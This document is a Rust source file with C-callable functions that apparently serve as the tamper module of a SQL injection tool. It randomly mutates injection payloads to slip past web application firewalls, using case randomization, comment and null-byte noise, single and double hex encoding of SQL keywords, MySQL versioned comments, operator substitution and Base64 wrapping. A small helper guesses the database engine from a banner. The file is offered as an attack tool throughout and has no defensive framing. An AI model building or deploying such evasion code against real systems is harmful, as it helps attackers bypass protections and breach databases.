use std::ffi::{CStr, CString};
use std::os::raw::c_char;
use rand::{thread_rng, Rng};
use base64::{Engine as _, engine::general_purpose};

#[unsafe(no_mangle)]
pub extern "C" fn rust_tamper_polymorphic(input: *const c_char) -> *mut c_char {
    if input.is_null() {
        return std::ptr::null_mut();
    }

    let c_str = unsafe { CStr::from_ptr(input) };
    let input_str = match c_str.to_str() {
        Ok(s) => s,
        Err(_) => return std::ptr::null_mut(),
    };

    let tampered = apply_polymorphic_rules(input_str);
    
    let c_string = CString::new(tampered).unwrap();
    c_string.into_raw()
}

fn apply_polymorphic_rules(payload: &str) -> String {
    let mut rng = thread_rng();
    let mut result = payload.to_string();

    // Rule 1: Case Randomization (lebih cepat di Rust)
    result = result.chars().map(|c| {
        if c.is_alphabetic() {
            if rng.gen_bool(0.5) { c.to_uppercase().next().unwrap() } else { c.to_lowercase().next().unwrap() }
        } else {
            c
        }
    }).collect();

    // Rule 2: Space to Inline Comments with extra noise (Expert mode)
    let noise = [
        "/*--%0A*/", 
        "/**/", 
        "/*!50000*/", 
        "/*!50443*/", // Often bypasses newer WAFs
        "%20", 
        "+", 
        "%0a", // Newline
        "/**_**/", // Underscore trick
        "/*%00*/", // Null byte comment
    ];
    result = result.replace(" ", noise[rng.gen_range(0..noise.len())]);

    // Rule 3: Hex Encoding for specific keywords + Double Encoding + Versioned Comments
    let keywords = ["SELECT", "UNION", "FROM", "WHERE", "DATABASE", "SLEEP", "BENCHMARK", "AND", "OR", "GROUP", "BY", "ORDER", "LIMIT", "SCHEMA", "TABLE", "COLUMN"];
    for &kw in &keywords {
        if result.to_uppercase().contains(kw) {
            let mut transformed = String::new();
            match rng.gen_range(0..7) {
                0 => { // Versioned comment bypass: /*!SELECT*/
                    transformed = format!("/*!{}*/", kw);
                },
                1 => { // Mixed hex and case
                    for b in kw.as_bytes() {
                        if rng.gen_bool(0.7) {
                            transformed.push_str(&format!("%{:02x}", b));
                        } else {
                            transformed.push(if rng.gen_bool(0.5) { (*b as char).to_uppercase().next().unwrap() } else { (*b as char).to_lowercase().next().unwrap() });
                        }
                    }
                },
                2 => { // Double Hex
                    for b in kw.as_bytes() {
                        transformed.push_str(&format!("%25{:02x}", b));
                    }
                },
                3 => { // Multi-line comment injection
                    transformed = format!("/*\n*/{}/*\n*/", kw);
                },
                4 => { // Alternative syntax (MySQL specific)
                    match kw {
                        "AND" => transformed = "&&".to_string(),
                        "OR" => transformed = "||".to_string(),
                        "=" => transformed = " LIKE ".to_string(),
                        _ => transformed = kw.to_string(),
                    }
                },
                5 => { // Parentheses wrapping
                    transformed = format!("({})", kw);
                },
                _ => { // Standard case randomization
                    transformed = kw.chars().map(|c| if rng.gen_bool(0.5) { c.to_uppercase().next().unwrap() } else { c.to_lowercase().next().unwrap() }).collect();
                }
            }
            result = result.replace(kw, &transformed);
        }
    }

    // Rule 4: SQL Comment Obfuscation (MySQL specific tricks)
    if rng.gen_bool(0.4) {
        result = result.replace("-- -", "#");
        result = result.replace("--", "/*!--*/");
    }

    // Rule 5: Add junk characters/headers if requested
    if rng.gen_bool(0.3) {
        result = format!("{}/*{}*/", result, rng.gen_range(1000..9999));
    }

    // Rule 4: Nested Base64 if it's too long
    if result.len() > 100 {
        let encoded = general_purpose::STANDARD.encode(result.as_bytes());
        result = format!("FROM_BASE64('{}')", encoded);
    }

    result
}

#[unsafe(no_mangle)]
pub extern "C" fn free_rust_string(s: *mut c_char) {
    if s.is_null() {
        return;
    }
    unsafe {
        let _ = CString::from_raw(s);
    }
}

#[unsafe(no_mangle)]
pub extern "C" fn rust_detect_db_version(banner: *const c_char) -> *mut c_char {
    if banner.is_null() {
        return std::ptr::null_mut();
    }

    let c_str = unsafe { CStr::from_ptr(banner) };
    let banner_str = match c_str.to_str() {
        Ok(s) => s,
        Err(_) => return std::ptr::null_mut(),
    };

    let version = if banner_str.contains("MySQL") {
        "MySQL Engine (Optimized by Rust)"
    } else if banner_str.contains("PostgreSQL") {
        "PostgreSQL Engine (Optimized by Rust)"
    } else {
        "Unknown (Analyzed by Rust)"
    };

    let c_string = CString::new(version).unwrap();
    c_string.into_raw()
}
